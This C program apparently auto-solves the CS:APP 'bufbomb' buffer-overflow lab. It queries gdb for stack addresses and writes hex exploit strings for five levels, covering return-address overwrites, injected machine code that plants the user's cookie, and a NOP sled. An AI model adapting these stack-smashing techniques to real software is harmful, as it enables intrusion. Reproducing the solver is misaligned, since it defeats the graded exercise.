#include<stdio.h>
#include<stdlib.h>
#include<string.h>
const char NOP='\220';
char addr_list[10][8];
char usr_cookie[8];
void analyse_msg(int st,int rear) {
	FILE * fp;

	char buffer[80];										//approximately
	fp=popen("cat cmd_lab3 | gdb | grep '(void '","r");		//use shell to find the value
	while(fgets(buffer,sizeof(buffer),fp) && st <= rear) {
		int iter,j;
		for(j=0;buffer[j]!='v';j++);						//find '(void *)
		j+=10;
		for(iter=0;iter<8;iter++) {
			addr_list[st][iter]=buffer[iter+j];				//get the address
			printf("%c",buffer[iter+j]);
		}
		printf("-----------st:%d\n",st);
		st++;
	}
	pclose(fp);
	return ;
}
void get_usr_cookie(char *usrname) {
	FILE * fp;
	
	char buffer[80];										//approximatel
	char cmd_tempstr[30];
	sprintf(cmd_tempstr,"./makecookie %s",usrname);
	fp=popen(cmd_tempstr,"r");								//use shell to get the cookie
	while(fgets(buffer,sizeof(buffer),fp)) {            
		int iter;
		for(iter=2;iter<10;iter++) {      
			usr_cookie[iter-2]=buffer[iter];				//get the cookie

		}         
	}          
	pclose(fp);
	return ; 
}
void build_cmd_file(int index,char *usrname){
	switch(index){
		case 2:
		{
			FILE *fp1;
			fp1 = fopen("cmd_lab3","w");
			fputs("file bufbomb\nb getbuf\nr -u ",fp1);
			fputs(usrname,fp1);
			fputs("\np $ebp-0x28\n",fp1);
			fclose(fp1);
			break;
		}
		case 3:
		{
			FILE *fp1;
			fp1 = fopen("cmd_lab3","w");
			fputs("file bufbomb\nb getbuf\nb *0x8048ca4\nr -u ",fp1);
			fputs(usrname,fp1);
			fputs("\np $ebp\nc\np $ebp-0x28\n",fp1);
			fclose(fp1);
			break;
		}
		case 4:
		{
			FILE *fp1;
			fp1 = fopen("plh.w","w");
			fputs("90 ",fp1);
			fclose(fp1);

			fp1 = fopen("cmd_lab3","w");
			fputs("file bufbomb\nb getbufn\nr -u ",fp1);
			fputs(usrname,fp1);
			fputs(" -n < ./hex2raw -n < plh.w\ndisplay $ebp-0x208\nc\nc\nc\nc\nc\n",fp1);
			fclose(fp1);
			break;
		}
	}
	return ;
}
void place_hold(FILE *fp,int times) {
	int i;
	for(i=0;i<times;i++) {
		fputs("90 ",fp);
	}
	return ;
}
void puts_the_value(FILE *fp,char *valuestr){
	char output_tempstr[3];
	int i;
	for(i=6;i>=0;i-=2)
	{   
		sprintf(output_tempstr,"%c%c ",valuestr[i],valuestr[i+1]);
		fputs(output_tempstr,fp);
	}
	return ;
}
int hex_large(int i,int max_addr)
{
	int j;
	for(j=0;j<8;j++)
		if(addr_list[i][j]>addr_list[max_addr][j])
			return 1;
		else if (addr_list[i][j] < addr_list[max_addr][j])
			return 0;
	return 0;
}
void print_ans(int index,char *usrname){
	FILE *fp1;             
	char out_name[20];  
	sprintf(out_name,"%s_ans%d",usrname,index);
	fp1 = fopen(out_name,"w");
	switch(index) {
		case 0:
		{
			place_hold(fp1,44);
			fputs("74 91 04 08 ",fp1);
			break;
		}
		case 1:
		{
			place_hold(fp1,44);
			fputs("29 91 04 08 ",fp1);
			place_hold(fp1,4);
			puts_the_value(fp1,usr_cookie);
			break ;
		}
		case 2:
		{
			fputs("b8 cc b1 04 08 c7 00 ",fp1);
			puts_the_value(fp1,usr_cookie);
			fputs("c3 ",fp1);
			place_hold(fp1,32);
			puts_the_value(fp1,addr_list[0]);
			fputs("dc 90 04 08 ",fp1);
			break;
		}
		case 3:
		{
			fputs("b8 ",fp1);
			puts_the_value(fp1,usr_cookie);
			fputs("68 39 8d 04 08 c3 ",fp1);
			place_hold(fp1,29);
			puts_the_value(fp1,addr_list[1]);
			puts_the_value(fp1,addr_list[2]);
			break;
		}
		case 4:
		{
			int i,max_addr=3;
			for(i=4;i<=7;i++)
				if(hex_large(i,max_addr))
					max_addr=i;
			place_hold(fp1,505);
			fputs("8d 6c 24 28 b8 ",fp1);
			puts_the_value(fp1,usr_cookie);
			fputs("68 cf 8c 04 08 c3 ",fp1);
			place_hold(fp1,4);
			puts_the_value(fp1,addr_list[max_addr]);
			break;
		}
	}
	fclose(fp1);
	printf("\tFinish the %dth.\n",index);
}
void provide_ans(char *usrname) {
	get_usr_cookie(usrname);
	print_ans(0,usrname);
	print_ans(1,usrname);
	build_cmd_file(2,usrname);
	analyse_msg(0,0);
	print_ans(2,usrname);
	build_cmd_file(3,usrname);
	analyse_msg(1,2);
	print_ans(3,usrname);
	build_cmd_file(4,usrname);
	analyse_msg(3,7);
	print_ans(4,usrname);
	system("rm cmd_lab3 plh.w");
	return ;
}
void show_help() {
	printf("\t-u for usr_name (e.g.: -u ics5130379000)\n");
	return ;
}
int main( int argc,char * argv[] ) {
	if(argc==3 && !strcmp(argv[1],"-u")) {
		printf("start...\n");
		provide_ans(argv[2]);
		printf("finished.\nanswer:\n");
		int i;
		for(i=0;i<5;i++)
			printf("\t%s_ans%d\n",argv[2],i);
	}	
	else
		show_help();
	return 0;
}
